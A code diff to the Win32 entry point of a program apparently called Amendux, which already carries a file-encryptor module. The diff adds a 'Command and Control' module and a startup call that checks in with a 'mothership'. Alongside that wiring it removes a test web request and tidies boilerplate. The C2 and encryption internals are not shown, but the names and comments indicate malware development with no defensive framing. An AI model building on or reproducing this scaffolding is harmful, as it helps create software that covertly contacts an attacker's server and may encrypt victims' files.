@@ -4,6 +4,7 @@
 #include "Log.h"
 #include "Encrypt.h"
 #include "Config.h"
+#include "Candcel.h"
 #include "Resource.h"
 
 #define MAX_LOADSTRING 100
@@ -11,6 +12,7 @@
 // Global modules
 Amendux::Encrypt FileCrypt;						// File encryptor module
 Amendux::Config cfg;							// Common config
+Amendux::Candcel Commander;						// Command and Control
 
 // Global Variables:
 HINSTANCE hInst;                                // Current instance
@@ -18,12 +20,12 @@ WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
 WCHAR szWindowClass[MAX_LOADSTRING];            // The main window class name
 
 // Forward declarations of functions included in this code module:
-ATOM                MyRegisterClass(HINSTANCE hInstance);
+ATOM                MainRegisterClass(HINSTANCE hInstance);
 BOOL                InitInstance(HINSTANCE, int);
 LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);
-#include "WebClient.h"
+
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
 {
     UNREFERENCED_PARAMETER(hPrevInstance);
@@ -31,28 +33,27 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	// Initialize and configure instance
 	Amendux::Log::Init();
 	Amendux::Config::Init(FileCrypt);
-	Amendux::WebClient("httpbin.org");
 
     // Initialize global strings
     LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
     LoadStringW(hInstance, IDC_WIN32PROJECT1, szWindowClass, MAX_LOADSTRING);
-    MyRegisterClass(hInstance);
+	MainRegisterClass(hInstance);
 
-    // Perform application initialization:
-    if (!InitInstance (hInstance, nCmdShow))
-    {
+    // Perform application initialization
+    if (!InitInstance(hInstance, nCmdShow)) {
         return FALSE;
     }
 
+	// Window accelerators
     HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));
 
-    MSG msg;
+	// Establish communications with mothership
+	Commander.CheckIn();
 
-    // Main message loop:
-    while (GetMessage(&msg, nullptr, 0, 0))
-    {
-        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
-        {
+	// Main message loop
+    MSG msg;
+    while (GetMessage(&msg, nullptr, 0, 0)) {
+        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) {
             TranslateMessage(&msg);
             DispatchMessage(&msg);
         }
@@ -71,7 +72,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 //
 //  PURPOSE: Registers the window class.
 //
-ATOM MyRegisterClass(HINSTANCE hInstance)
+ATOM MainRegisterClass(HINSTANCE hInstance)
 {
     WNDCLASSEXW wcex;
 
@@ -110,8 +111,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
       CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
 
-   if (!hWnd)
-   {
+   if (!hWnd) {
       return FALSE;
    }
 
